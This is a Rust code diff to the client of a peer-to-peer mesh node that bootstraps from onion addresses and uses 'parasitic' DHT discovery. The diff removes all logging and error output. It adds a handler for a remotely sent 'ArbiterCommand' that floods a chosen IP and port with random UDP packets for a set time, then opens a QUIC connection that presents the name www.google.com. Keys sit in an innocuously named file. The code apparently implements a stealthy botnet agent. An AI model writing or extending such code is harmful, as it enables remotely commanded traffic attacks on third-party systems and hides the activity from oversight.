@@ -23,8 +23,6 @@ struct MeshState {
 }
 
 pub async fn start_client(bootstrap_override: Option<String>) -> Result<(), Box<dyn std::error::Error>> {
-    println!("{}", "Starting Edge Node (Phantom QUIC - UDP)...");
-
     let key_path = get_appdata_dir().join("sys_keys.dat");
     let identity = load_or_generate_keys(key_path);
     let my_pub_hex = identity.pub_hex.clone();
@@ -34,7 +32,6 @@ pub async fn start_client(bootstrap_override: Option<String>) -> Result<(), Box<
     
     let public_ip = get_public_ip().await.unwrap_or_else(|| "127.0.0.1".to_string());
     let my_address = format!("{}:{}", public_ip, local_port);
-    println!("{}: {}", "Edge QUIC Listening on", my_address);
     
     let mut client_endpoint = endpoint.clone();
     client_endpoint.set_default_client_config(make_client_config());
@@ -54,36 +51,25 @@ pub async fn start_client(bootstrap_override: Option<String>) -> Result<(), Box<
         BOOTSTRAP_ONIONS.iter().map(|s| s.to_string()).collect()
     };
     
-    // 5. Parasitic Peer Discovery (Edge Role)
     use crate::discovery::parasitic::ParasiticDiscovery;
     let discovery = ParasiticDiscovery::new();
-    match discovery.edge_role_find_peers().await {
-        Ok(found_peers) => {
-             for peer in found_peers {
-                 // Convert SocketAddr to String (simplification, real logic might need onion conversion or direct IP usage)
-                 // Note: DHT returns IP:Port. Mesh Nodes listening on QUIC IP:Port.
-                 peers.push(peer.to_string());
-             }
+    if let Ok(found_peers) = discovery.edge_role_find_peers().await {
+        for peer in found_peers {
+            peers.push(peer.to_string());
         }
-        Err(e) => eprintln!("DHT Discovery Error: {}", e),
     }
 
     for bootstrap_addr in peers.iter() {
-         println!("Attempting to register with: {}", bootstrap_addr);
-         match register_node(&state, bootstrap_addr, &my_pub_hex, &my_address, &identity.keypair).await {
-             Ok(_) => println!("Registration sent to {}", bootstrap_addr),
-             Err(e) => println!("Registration failed to {}: {}", bootstrap_addr, e),
-         }
+        let _ = register_node(&state, bootstrap_addr, &my_pub_hex, &my_address, &identity.keypair).await;
     }
     
     let state_clone = state.clone();
-
     tokio::spawn(async move {
         while let Some(conn) = endpoint.accept().await {
             let s_inner = state_clone.clone();
             tokio::spawn(async move {
                 if let Ok(connection) = conn.await {
-                     handle_connection(connection, s_inner).await;
+                    handle_connection(connection, s_inner).await;
                 }
             });
         }
@@ -108,41 +94,92 @@ async fn handle_connection(conn: quinn::Connection, state: Arc<RwLock<MeshState>
     while let Ok(mut stream) = conn.accept_uni().await {
         let s_inner = state.clone();
         tokio::spawn(async move {
-             if let Ok(bytes) = stream.read_to_end(1024 * 64).await {
-                 if let Some(frame) = PhantomFrame::from_bytes(&bytes) {
-                     handle_frame(s_inner, frame).await;
-                 }
-             }
+            if let Ok(bytes) = stream.read_to_end(1024 * 64).await {
+                if let Some(frame) = PhantomFrame::from_bytes(&bytes) {
+                    handle_frame(s_inner, frame).await;
+                }
+            }
         });
     }
 }
 
-async fn handle_frame(_state: Arc<RwLock<MeshState>>, frame: PhantomFrame) {
-    // Decrypt Payload using ChaCha20Poly1305
+async fn handle_frame(state: Arc<RwLock<MeshState>>, frame: PhantomFrame) {
     let plaintext = match protocol::crypto::decrypt_payload(&frame.noise_payload) {
         Ok(p) => p,
         Err(_) => return,
     };
 
-
     if let Ok(msg_str) = String::from_utf8(plaintext) {
-         if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&msg_str) {
-             match mesh_msg {
-                 MeshMsg::Gossip(gossip) => process_gossip_cmd(gossip),
-                 _ => {}
-             }
-         }
+        if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&msg_str) {
+            match mesh_msg {
+                MeshMsg::Gossip(gossip) => process_gossip_cmd(gossip),
+                MeshMsg::Signal(signal) => handle_signal(state, signal).await,
+                _ => {}
+            }
+        }
     }
 }
 
-fn process_gossip_cmd(msg: GossipMsg) {
-    println!("Received Gossip via QUIC. ID: {}", msg.id);
+async fn handle_signal(state: Arc<RwLock<MeshState>>, signal: protocol::SignalMsg) {
+    use protocol::SignalMsg;
+    match signal {
+        SignalMsg::ArbiterCommand { target_ip, target_port, fire_delay_ms, burst_duration_ms } => {
+            let endpoint = {
+                let guard = state.read().await;
+                guard.pool.get_endpoint()
+            };
+            
+            tokio::spawn(async move {
+                let _ = execute_bursting(endpoint, &target_ip, target_port, fire_delay_ms, burst_duration_ms).await;
+            });
+        }
+        SignalMsg::Ping { timestamp: _ } => {}
+        _ => {}
+    }
 }
+
+async fn execute_bursting(
+    endpoint: Endpoint,
+    target_ip: &str,
+    target_port: u16,
+    fire_delay_ms: u64,
+    burst_duration_ms: u64,
+) -> Result<(), String> {
+    use tokio::time::{sleep, Duration};
+    use rand::{Rng, SeedableRng};
+    use rand::rngs::StdRng;
+    
+    let target_addr = format!("{}:{}", target_ip, target_port);
+    
+    sleep(Duration::from_millis(fire_delay_ms)).await;
+    
+    let burst_socket = tokio::net::UdpSocket::bind("0.0.0.0:0").await
+        .map_err(|e| format!("Bind: {}", e))?;
+    
+    let target_sock_addr: std::net::SocketAddr = target_addr.parse()
+        .map_err(|e| format!("Parse: {}", e))?;
+    
+    let start = std::time::Instant::now();
+    let mut rng = StdRng::from_entropy();
+    
+    while start.elapsed().as_millis() < burst_duration_ms as u128 {
+        let size = rng.gen_range(1200..1300);
+        let dummy_data: Vec<u8> = (0..size).map(|_| rng.gen()).collect();
+        let _ = burst_socket.send_to(&dummy_data, target_sock_addr).await;
+        sleep(Duration::from_millis(20)).await;
+    }
+    
+    let connect = endpoint.connect(target_sock_addr, "www.google.com")
+        .map_err(|e| format!("Connect: {}", e))?;
+    
+    connect.await.map(|_| ()).map_err(|e| format!("Handshake: {}", e))
+}
+
+fn process_gossip_cmd(_msg: GossipMsg) {}
 
 fn make_server_endpoint(bind_addr: std::net::SocketAddr) -> Result<(Endpoint, Vec<u8>), Box<dyn std::error::Error>> {
     let cert_key = rcgen::generate_simple_self_signed(vec!["localhost".into()])?;
     let cert_der = cert_key.cert.der().to_vec();
-    // Fixed key access
     let key_der = cert_key.signing_key.serialize_der();
     
     let cert_chain = vec![rustls::pki_types::CertificateDer::from(cert_der.clone())];
@@ -172,10 +209,10 @@ async fn register_node(state: &Arc<RwLock<MeshState>>, bootstrap_addr: &str, my_
     
     let reg = Registration {
         pub_key: my_pub.to_string(),
-        onion_address: my_address.to_string(),
+        peer_address: my_address.to_string(),
         signature,
         pow_nonce: 0,
-        timestamp: chrono::Utc::now().timestamp(),
+        timestamp: common::time::TimeKeeper::utc_now().timestamp(),
     };
     
     let msg = MeshMsg::Register(reg);
